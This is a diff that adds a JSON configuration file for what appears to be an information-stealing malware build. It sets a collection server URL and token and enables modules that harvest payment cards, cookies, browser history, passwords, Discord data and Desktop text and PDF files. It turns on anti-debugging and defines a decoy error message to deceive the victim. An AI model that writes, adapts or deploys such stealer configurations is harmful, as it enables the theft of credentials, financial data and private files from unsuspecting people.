@@ -1,0 +1,25 @@
+{
+  "MAP$config.token$": "OxKxwPffW4JPZfe",
+  "MAP$config.url$": "http://192.168.122.1:8082",
+  "MAP$config.quiet$": false,
+  "MAP$config.modules$": [
+    "card",
+    "cookie",
+    "history",
+    "password",
+    "files",
+    "discord",
+    "error"
+  ],
+  "MAP$config.antivm$": false,
+  "MAP$config.antidebug$": true,
+  "MAP$config.error$": {
+    "MAP$config.error.title$": "Some error",
+    "MAP$config.error.message$": "Very real error message"
+  },
+  "MAP$config.files$": {
+    "MAP$config.files.max$": 5,
+    "MAP$config.files.dirs$": ["C:/Users/%USERNAME%/Desktop"],
+    "MAP$config.files.exts$": ["txt", "pdf"]
+  }
+}
